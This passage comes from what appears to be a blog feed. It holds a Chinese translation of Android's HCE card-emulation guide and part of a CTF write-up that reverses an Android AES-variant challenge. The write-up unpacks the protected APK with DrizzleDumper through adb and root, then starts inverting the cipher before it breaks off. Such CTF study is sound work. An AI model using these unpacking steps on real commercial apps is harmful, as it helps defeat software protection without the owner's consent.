href="https://developer.android.com/reference/android/content/pm/PackageManager.html#FEATURE_NFC_HOST_CARD_EMULATION" target="_blank" rel="noopener">FEATURE_NFC_HOST_CARD_EMULATION</a>功能来检查设备是否支持HCE 。您应该<a href="https://developer.android.com/guide/topics/manifest/uses-feature-element.html" target="_blank" rel="noopener"><code>&lt;uses-feature&gt;</code></a>在应用程序清单中使用该标记来声明您的应用程序使用HCE功能，以及该应用程序是否需要运行。</p><h3 id="服务实施">5.2 服务实施</h3><p>Android 4.4带有一个便利的<a href="https://developer.android.com/reference/android/app/Service.html" target="_blank" rel="noopener">Service</a>类，可以作为实现HCE服务的基础：<a href="https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html" target="_blank" rel="noopener">HostApduService</a>类。</p><p>因此，第一步要扩大<a href="https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html" target="_blank" rel="noopener">HostApduService</a>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyHostApduService</span> <span class="keyword">extends</span> <span class="title">HostApduService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] processCommandApdu(<span class="keyword">byte</span>[] apdu, Bundle extras) &#123;</span><br><span class="line">       ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDeactivated</span><span class="params">(<span class="keyword">int</span> reason)</span> </span>&#123;</span><br><span class="line">       ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html" target="_blank" rel="noopener">HostApduService</a>声明了两个需要重写和实现的抽象方法。</p><p><a href="https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html" target="_blank" rel="noopener">processCommandApdu()</a>只要NFC读卡器将应用协议数据单元（APDU）发送到您的服务，就会调用它。APDU也在ISO / IEC 7816-4规范中定义。APDU是在NFC读卡器和您的HCE服务之间交换的应用级数据包。该应用级协议是半双工的：NFC读卡器会向您发送命令APDU，并等待您发送响应APDU作为回报。</p><blockquote><p><strong>注：</strong> ISO / IEC 7816-4规范还定义了多个逻辑信道的概念，您可以在单独的逻辑信道上进行多个并行APDU交换。Android的HCE实现只支持单个逻辑通道，所以只有单线程交换APDU。</p></blockquote><p>如前所述，Android使用AID来确定读者想要与哪个HCE服务交谈。通常，NFC读卡器向您的设备发送的第一个APDU是“SELECT AID”APDU; 这个APDU包含读卡器想与之交谈的AID。Android从APDU中提取AID，将其解析为HCE服务，然后将该APDU转发给已解析的服务。</p><p>您可以通过返回响应APDU的字节来发送响应APDU <a href="https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html#processCommandApdu(byte%5B%5D,%20android.os.Bundle)" target="_blank" rel="noopener">processCommandApdu()</a>。请注意，此方法将在应用程序的主线程中调用，该线程不应被阻止。所以如果你不能立即计算并返回一个响应APDU，那么返回null。然后，您可以在另一个线程上完成必要的工作，并<a href="https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html#sendResponseApdu(byte%5B%5D)" target="_blank" rel="noopener">sendResponseApdu()</a>在完成后使用<a href="https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html" target="_blank" rel="noopener">HostApduService</a>该类中定义的方法发送响应。</p><p>Android会继续将新的APDU从读取器转发到您的服务，直到：</p><ol type="1"><li>NFC读卡器发送另一个“SELECT AID” APDU，OS将其解析为不同的服务;</li><li>NFC读卡器和您的设备之间的NFC链接被破坏。</li></ol><p>在这两种情况下，你的类的 <a href="https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html#onDeactivated(int)" target="_blank" rel="noopener">onDeactivated()</a>实现都是通过一个参数来调用的，这个参数指出了两者中的哪一个发生了。</p><p>如果您正在使用现有的读卡器基础架构，则需要实现读卡器在您的HCE服务中期望的现有应用程序级协议。</p><p>如果您正在部署您控制的新读卡器基础架构，则可以定义自己的协议和APDU序列。通常，尝试限制APDU数量和需要交换的数据大小：这样可以确保用户只需将设备通过NFC读取器持续一段时间即可。合理的上限约为1KB的数据，通常可以在<strong>300ms</strong>内交换。</p><h3 id="服务清单声明和aid注册">5.3 服务清单声明和AID注册</h3><p>您的服务必须像往常一样在清单中声明，但还必须在服务声明中添加一些附加件。</p><p>首先，为了告诉平台它是一个实现<a href="https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html" target="_blank" rel="noopener">HostApduService</a>接口的HCE服务 ，你的服务声明必须包含一个<a href="https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html#SERVICE_INTERFACE" target="_blank" rel="noopener">SERVICE_INTERFACE</a>动作的<a href="https://blog.csdn.net/mynameishuangshuai/article/details/51673273" target="_blank" rel="noopener">Intent Filter</a>。</p><p>另外，为了告知平台哪个AIDs组被这个服务请求，一个<a href="https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html#SERVICE_META_DATA" target="_blank" rel="noopener">SERVICE_META_DATA</a><code>&lt;meta-data&gt;</code>标签必须包含在服务的声明中，指向一个XML资源和关于HCE服务的附加信息。</p><p>最后，您必须将该<code>android:exported</code>属性设置为true，并且<code>"android.permission.BIND_NFC_SERVICE"</code>在服务声明中要求权限。前者确保服务可以被外部应用程序绑定。后者然后强制只有拥有该<code>"android.permission.BIND_NFC_SERVICE"</code>权限的外部应用程序 才能绑定到您的服务。既然<code>"android.permission.BIND_NFC_SERVICE"</code>是一个系统权限，这有效地强制只有Android OS可以绑定到你的服务。</p><p>这是一个<a href="https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html" target="_blank" rel="noopener">HostApduService</a>清单声明的例子：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">".MyHostApduService"</span> <span class="attr">android:exported</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">android:permission</span>=<span class="string">"android.permission.BIND_NFC_SERVICE"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.nfc.cardemulation.action.HOST_APDU_SERVICE"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">"android.nfc.cardemulation.host_apdu_service"</span></span></span><br><span class="line"><span class="tag">               <span class="attr">android:resource</span>=<span class="string">"@xml/apduservice"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个元数据标签指向一个<code>apduservice.xml</code>文件。下面显示了具有包含两个专有AID的单个AID组声明的此类文件的示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">host-apdu-service</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">           <span class="attr">android:description</span>=<span class="string">"@string/servicedesc"</span></span></span><br><span class="line"><span class="tag">           <span class="attr">android:requireDeviceUnlock</span>=<span class="string">"false"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aid-group</span> <span class="attr">android:description</span>=<span class="string">"@string/aiddescription"</span></span></span><br><span class="line"><span class="tag">               <span class="attr">android:category</span>=<span class="string">"other"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aid-filter</span> <span class="attr">android:name</span>=<span class="string">"F0010203040506"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aid-filter</span> <span class="attr">android:name</span>=<span class="string">"F0394148148100"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aid-group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">host-apdu-service</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该<code>&lt;host-apdu-service&gt;</code>标签需要包含一个<code>&lt;android:description&gt;</code> 属性，该属性包含可能在UI中显示的用户友好的服务描述。该<code>requireDeviceUnlock</code>属性可用于指定在调用此服务来处理APDU之前必须先解锁设备。</p><p>在<code>&lt;host-apdu-service&gt;</code>必须包含一个或多个<code>&lt;aid-group&gt;</code>标签。每个 <code>&lt;aid-group&gt;</code>标签都需要：</p><ul><li>包含一个<code>android:description</code>属性，其中包含用户友好的AID组描述，适合在UI中显示。</li><li>将其<code>android:category</code>属性设置为指示AID组所属的类别，例如<a href="https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_PAYMENT" target="_blank" rel="noopener">CATEGORY_PAYMENT</a> or 定义的字符串常<a href="https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_OTHER" target="_blank" rel="noopener">CATEGORY_OTHER</a>。</li><li>每个标签<code>&lt;aid-group&gt;</code>必须包含一个或多个 <code>&lt;aid-filter&gt;</code>标签，每个标签包含一个AID。AID必须以十六进制格式指定，并且包含偶数个字符。</li></ul><p>最后，您的应用程序还需要拥有<a href="https://developer.android.com/reference/android/Manifest.permission.html#NFC" target="_blank" rel="noopener">NFC</a>可以注册为HCE服务的 权限。</p><h2 id="x06-aid冲突解决">0x06 AID冲突解决</h2><p>多个<a href="https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html" target="_blank" rel="noopener">HostApduService</a>组件可以安装在单个设备上，并且可以由多个服务注册相同的AID。Android平台根据AID属于哪个类别来解决AID冲突。每个类别可能有不同的冲突解决策略。</p><p>例如，对于某些类别（如付款），用户可能能够在Android设置UI中选择默认服务。对于其他类别，策略可能总是要求用户在冲突情况下调用哪个服务。要查询特定类别的冲突解决策略，请参阅 <a href="https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#getSelectionModeForCategory(java.lang.String)" target="_blank" rel="noopener">getSelectionModeForCategory()</a>。</p><h3 id="检查您的服务是否为默认设置">6.1 检查您的服务是否为默认设置</h3><p>应用程序可以使用<a href="https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#isDefaultServiceForCategory(android.content.ComponentName,%20java.lang.String)" target="_blank" rel="noopener">isDefaultServiceForCategory(ComponentName, String)</a>API 检查其HCE服务是否是某个类别的默认服务。</p><p>如果您的服务不是默认设置，则可以请求将其设置为默认设置。看<a href="https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#ACTION_CHANGE_DEFAULT" target="_blank" rel="noopener">ACTION_CHANGE_DEFAULT</a>。</p><h2 id="x07-付款应用">0x07 付款应用</h2><p>Android会将AID组为“payment”的类别，声明的HCE服务视为支付应用程序。Android 4.4版本包含一个名为“tap＆pay”的top-level设置菜单条目，它列举了所有这些支付应用程序。在此设置菜单中，用户可以选择在点按付款终端时将调用的默认支付应用程序。</p><h3 id="支付应用程序所需的resource">7.1 支付应用程序所需的resource</h3><p>为了提供更具视觉吸引力的用户体验，HCE支付应用程序需要为其服务提供额外的resource：所谓的服务标记。</p><p>这个asset的大小应该是260x96 dp，并且可以在元数据(meta-data)XML文件中通过添加指向drawable resource<code>android:apduServiceBanner</code>的<code>&lt;host-apdu-service&gt;</code>标签的属性来指定 。一个例子如下所示： <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">host-apdu-service</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:description</span>=<span class="string">"@string/servicedesc"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:requireDeviceUnlock</span>=<span class="string">"false"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:apduServiceBanner</span>=<span class="string">"@drawable/my_banner"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aid-group</span> <span class="attr">android:description</span>=<span class="string">"@string/aiddescription"</span></span></span><br><span class="line"><span class="tag">               <span class="attr">android:category</span>=<span class="string">"payment"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aid-filter</span> <span class="attr">android:name</span>=<span class="string">"F0010203040506"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aid-filter</span> <span class="attr">android:name</span>=<span class="string">"F0394148148100"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aid-group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">host-apdu-service</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="x08-屏幕关闭和锁屏行为">0x08 屏幕关闭和锁屏行为</h2><p>当设备的屏幕关闭时，当前的Android实施将NFC控制器和应用程序处理器完全关闭。因此，当屏幕关闭时，HCE服务将无法工作。</p><p>然而，HCE服务可以从锁定屏幕中起作用：这由HCE服务标记中的<code>android:requireDeviceUnlock</code>属性控制<code>&lt;host-apdu-service&gt;</code>。默认情况下，不需要设备解锁，即使设备被锁定，您的服务也会被调用。</p><p>如果您将<code>android:requireDeviceUnlock</code>HCE服务的属性设置为“true”，Android会提示用户在您靠近NFC读卡器时解锁设备，NFC读卡器会选择已解析为您的服务的AID。解锁后，Android会显示一个对话框，提示用户再次点击以完成交易。这是必要的，因为用户可能已经将设备从NFC读卡器移开以便解锁它。</p><h2 id="x09-与se卡共存">0x09 与SE卡共存</h2><p>本部分对于已经部署依赖SE进行卡模拟的应用程序的开发人员很感兴趣。Android的HCE实现旨在与其他实现卡仿真的方法并行工作，包括使用SE。</p><blockquote><p><strong>注意：</strong> Android不提供用于直接与SE进行通信的API。</p></blockquote><p>这种共存基于一种称为“AID路由”的原则：NFC控制器保留一个由（有限）路由规则列表组成的路由表。每个路由规则都包含一个AID和一个目的地。目标可以是主机CPU（Android应用程序正在运行的地方），也可以是连接的SE。</p><p>当NFC读卡器发送具有“SELECT AID”的APDU时，NFC控制器解析它并检查AID是否与其路由表中的任何AID匹配。如果匹配，那么APDU和其后的所有APDU将被发送到与AID相关联的目的地，直到收到另一个“SELECT AID” APDU或NFC链路断开。</p><blockquote><p><strong>注意：</strong> 虽然ISO / IEC 7816-4也定义了“部分匹配”的概念，但目前Android HCE设备不支持此功能。</p></blockquote><p>图4说明了这种架构。</p><center><img src="https://github.com/killshadow/killshadow.github.io/blob/master/image/002/4.png?raw=true" title="fig:" alt="图4.使用SE和主机卡模拟的Android操作"></center><p>NFC控制器通常还包含APDU的默认路由。在路由表中找不到AID时，将使用默认路由。尽管此设置可能因设备而异，但Android设备需要确保您的应用注册的AID已正确路由到主机。</p><p>实现HCE服务或使用SE的Android应用程序不必担心配置路由表 - 这是由Android自动处理的。Android只需要知道哪些AID可以由HCE服务处理，哪些可以由SE处理。基于哪些服务已安装，以及哪些用户已配置为首选服务，路由表会自动配置。</p><p>我们已经介绍了如何声明HCE服务的AID。以下部分说明如何为使用SE进行卡模拟的应用程序声明AID。</p><h3 id="secure-element-aid注册">9.1 Secure Element AID注册</h3><p>使用SE进行卡模拟的应用程序可以在其清单中声明所谓的“关闭主机服务”。这种服务的声明几乎与宣布HCE服务相同。以下情况例外：</p><ul><li><p>意图过滤器中使用的操作必须设置为 <a href="https://developer.android.com/reference/android/nfc/cardemulation/OffHostApduService.html#SERVICE_INTERFACE" target="_blank" rel="noopener">SERVICE_INTERFACE</a>。</p></li><li><p>元数据名称属性必须设置为 <a href="https://developer.android.com/reference/android/nfc/cardemulation/OffHostApduService.html#SERVICE_META_DATA" target="_blank" rel="noopener">SERVICE_META_DATA</a>。</p></li><li><p>元数据XML文件必须使用<code>&lt;offhost-apdu-service&gt;</code>根标签。</p><p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">".MyOffHostApduService"</span> <span class="attr">android:exported</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">android:permission</span>=<span class="string">"android.permission.BIND_NFC_SERVICE"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.nfc.cardemulation.action.OFF_HOST_APDU_SERVICE"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">"android.nfc.cardemulation.off_host_apdu_service"</span></span></span><br><span class="line"><span class="tag">               <span class="attr">android:resource</span>=<span class="string">"@xml/apduservice"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure></p></li></ul><p>相应<code>apduservice.xml</code>文件注册两个AID 的示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">offhost-apdu-service</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">           <span class="attr">android:description</span>=<span class="string">"@string/servicedesc"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aid-group</span> <span class="attr">android:description</span>=<span class="string">"@string/subscription"</span> <span class="attr">android:category</span>=<span class="string">"other"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aid-filter</span> <span class="attr">android:name</span>=<span class="string">"F0010203040506"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aid-filter</span> <span class="attr">android:name</span>=<span class="string">"F0394148148100"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aid-group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">offhost-apdu-service</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该<code>android:requireDeviceUnlock</code>属性不适用于脱离主机服务，因为主机CPU不参与事务，因此无法阻止SE在设备锁定时执行事务。</p><p>该<code>android:apduServiceBanner</code>属性必须用于作为支付应用程序的关闭主机服务，以便作为默认支付应用程序进行选择。</p><h3 id="关闭主机服务调用">9.2 关闭主机服务调用</h3><p>Android本身永远不会启动或绑定到声明为“脱离主机”的服务。这是因为实际交易由SE执行，而不是由Android服务本身执行。服务声明仅允许应用程序注册安全元件(Secure Element)上存在的AID。</p><h2 id="x0a-hce和安全">0x0A HCE和安全</h2><p>HCE体系结构本身提供了一个核心安全性：因为您的服务受到<a href="https://developer.android.com/reference/android/Manifest.permission.html#BIND_NFC_SERVICE" target="_blank" rel="noopener">BIND_NFC_SERVICE</a>系统权限的保护，所以只有操作系统可以绑定到您的服务并与之通信。这可以确保您收到的任何APDU实际上都是OS从NFC控制器接收到的APDU，并且您发回的任何APDU只会发送到操作系统，而操作系统会直接将APDU转发给NFC控制器。</p><p>剩下的核心部分就是您获取应用程序发送给NFC读卡器的数据的位置。这在HCE设计中有意解耦：它不关心数据来自何处，它只是确保将其安全地传送到NFC控制器并传送到NFC读取器。</p><p>为了安全地存储和检索您希望从HCE服务发送的数据，例如，您可以依靠Android应用程序沙箱，将应用程序的数据与其他应用程序隔离。有关Android安全性的更多详细信息，请阅读 <a href="https://developer.android.com/training/articles/security-tips.html" target="_blank" rel="noopener">安全提示</a>。</p><h2 id="x0b-协议参数和细节">0x0B 协议参数和细节</h2><p>这部分内容对于希望了解HCE设备在NFC协议的防冲突和激活阶段使用何种协议参数的开发人员很感兴趣。这允许构建与Android HCE设备兼容的读卡器基础结构。</p><h3 id="nfc-aiso-iec-14443-a型协议防冲突和激活">11.1 Nfc-A（ISO / IEC 14443 A型）协议防冲突和激活</h3><p>作为Nfc-A协议激活的一部分，交换多个帧。</p><p>在交换的第一部分，HCE设备将呈现其UID; HCE设备应该被假定为具有随机的UID。这意味着在每个抽头中，呈现给读卡器的UID将是随机生成的UID。因此，NFC读卡器不应依赖HCE设备的UID作为身份验证或身份验证的一种形式。</p><p>NFC读取器可以随后通过发送SEL_REQ命令来选择HCE设备。HCE设备的SEL_RES响应将至少设置第6位（0x20），表示设备支持ISO-DEP。注意，SEL_RES中的其他位也可以被设置，表示例如对NFC-DEP（p2p）协议的支持。由于可以设置其他位，所以想要与HCE设备交互的读者应该明确检查第6位，并且<stront style="box-sizing: inherit;">不要将完整的SEL_RES与值0x20进行比较。</stront></p><h3 id="iso-dep激活">11.2 ISO-DEP激活</h3><p>Nfc-A协议激活后，NFC读取器启动ISO-DEP协议激活。它发送一个“RATS”（请求选择应答）命令。RATS响应（ATS）完全由NFC控制器生成，不能由HCE服务配置。然而，HCE实现需要满足NFC论坛对ATS响应的要求，因此NFC读卡器可以根据NFC论坛对任何HCE设备的要求设置这些参数。</p><p>以下部分提供了有关NFC控制器在HCE设备上提供的ATS响应的各个字节的更多详细信息：</p><ul><li>TL：ATS响应的长度。不得指示大于20个字节的长度。</li><li>T0：必须在所有HCE设备上设置位5,6和7，指示TA（1），TB（1）和TC（1）包含在ATS响应中。比特1至4指示FSCI，编码最大帧大小。在HCE设备上，FSCI的值必须在0h和8h之间。</li><li>T（A）1：定义读卡器和模拟器之间的比特率，以及它们是否可以是不对称的。HCE设备没有比特率要求或保证。</li><li>T（B）1：位1至4指示启动帧保护时间整数（SFGI）。在HCE设备上，SFGI必须&lt;= 8h。位5到8指示帧等待时间整数（FWI）并编码帧等待时间（FWT）。在HCE设备上，FWI必须&lt;= 8h。</li><li>T（C）1：位5表示支持“高级协议功能”。HCE设备可能支持或不支持“高级协议功能”。位2表示对DID的支持。HCE设备可能支持DID，也可能不支持DID。位1表示支持NAD。HCE设备不能支持NAD并将位1设置为零。</li><li>历史字节：HCE设备最多可以返回15个历史字节。愿意与HCE服务交互的NFC读卡器不应该假设历史字节的内容或它们的存在。</li></ul><p>请注意，许多HCE设备可能符合EMVCo联合的支付网络在其“非接触式通信协议”规范中指定的协议要求。尤其是：</p><ul><li>T0中的FSCI必须在2小时和8小时之间。</li><li>T（A）1必须设置为0x80，表示仅支持106 kbit / s比特率，并且不支持读卡器和仿真器之间的非对称比特率。</li><li>T（B）1中的FWI必须&lt;= 7h。</li></ul><h3 id="apdu数据交换">11.3 APDU数据交换</h3><p>如前所述，HCE实现仅支持单个逻辑通道。尝试在不同的逻辑通道上选择应用程序将不适用于HCE设备。</p><h2 id="x0c-后记">0x0C 后记</h2><p>本文<a href="https://developer.android.com/guide/topics/connectivity/nfc/hce" target="_blank" rel="noopener">翻译自</a>谷歌开发者文档，已由本人仔细校对。如有错误，请联系我，以便修改。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;x00-概述&quot;&gt;0x00 概述&lt;/h2&gt;
&lt;p&gt;许多提供NFC功能的基于Android的设备已经支持NFC卡模拟。在大多数情况下，该卡由设备中的单独芯片模拟，称为&lt;em&gt;安全元件(Secure Element)&lt;/em&gt;。无线运营商提供的许多SIM卡还包含安全元件(Secure Element)。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android Developer" scheme="http://www.killshadow.xyz/tags/Android-Developer/"/>
    
  </entry>
  
  <entry>
    <title>某AES变种题分析</title>
    <link href="http://www.killshadow.xyz/2018/05/10/%E6%9F%90aes%E5%8F%98%E7%A7%8D%E9%A2%98%E5%88%86%E6%9E%90/"/>
    <id>http://www.killshadow.xyz/2018/05/10/某aes变种题分析/</id>
    <published>2018-05-09T16:00:00.000Z</published>
    <updated>2019-06-04T05:12:44.481Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/killshadow/CTFTopic/tree/master/reverse/Android/GAESAndroid" target="_blank" rel="noopener">源码</a></p><h3 id="一脱壳">一、脱壳</h3><p>1.使用jeb打开下载的apk文件，发现代码十分混乱，很明显是加固混淆过的代码，所以需要先将其脱壳。 <a id="more"></a> 2.现在网络上的免费加固服务基本都是第一代，第二代加固，手动脱壳网络上也有很多的教程，这里使用一个现成的工具进行脱壳。 3.DrizzleDumper自动脱壳工具： <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd xxxxx/drizzleDumper</span><br><span class="line">adb push drizzleDumper /<span class="keyword">data</span>/local/tmp</span><br><span class="line">adb shell chmod <span class="number">777</span> /<span class="keyword">data</span>/local/tmp/drizzleDumper</span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">./<span class="keyword">data</span>/local/tmp/drizzleDumper com.example.zhang.gaesandroid <span class="number">3</span></span><br></pre></td></tr></table></figure></p><p>脱下来的dex文件默认文件名为<code>com.example.zhang.gaesandroid_dumped_88.dex</code>，导出发现脱壳完毕。</p><h3 id="二逻辑分析算法分析--decode">二、逻辑分析/算法分析--Decode</h3><p>1.脱壳后，将apk文件反编译，可以看到<code>MainActivity</code>中主要逻辑为： 明文密钥: <code>String key="This is a AES-like encryptionalgorithm....Our challenge is to find the plain text of this encrypt messagewith th fixed key. ";</code> 输出密文: <code>String encryptedText="eaZwtl5nsHW3ledvoZCdFla5yG13p2Txfq3AN7LEX7s2uK+v7x2Wsz/7jbe0G6R2";</code> 寻找<code>plainText</code>满足<code>encrypt(plainText,key)==encryptedText</code> 所以，解法为<strong>阅读encrypt方法，写出其逆算法</strong>.</p><p>2.encrypt算法为AES算法，可以在资源文件中找到其流程图aes.png或者从网上搜索到流程，主要逻辑为： 将明文按16位进行切割（如果不足补0），对每一个16位，将其用类<code>LightState</code>进行操作，加上密钥后，调用LightState的方法获得16位密文，拼接在一起获得最终密文，然后base64输出，代码逻辑为： <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">LightState state=<span class="keyword">new</span> LightState(inputBytes);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> round=<span class="number">0</span>;round&lt;=<span class="number">10</span>;round++) &#123;</span><br><span class="line">    byteroundKey[]=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">16</span>;j++) &#123;</span><br><span class="line">        roundKey[j]=keyBytes[round*<span class="number">16</span>+j];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span>(round==<span class="number">0</span>)&#123;</span><br><span class="line">        state.addRoundKey(roundKey);</span><br><span class="line">    &#125; </span><br><span class="line">    elseif(round&lt;<span class="number">10</span>) &#123;</span><br><span class="line">        state.substitute();</span><br><span class="line">        state.shiftRows();</span><br><span class="line">        state.mixCloumns();</span><br><span class="line">        state.addRoundKey(roundKey);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        state.substitute();</span><br><span class="line">        state.shiftRows();</span><br><span class="line">        state.addRoundKey(roundKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>3.因此，可以写出逆算法逻辑（或者查到揭秘逻辑）为： <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">State state=<span class="keyword">new</span> State(inputBytes, <span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> round=<span class="number">0</span>;round&lt;=<span class="number">10</span>;round++) &#123;</span><br><span class="line">    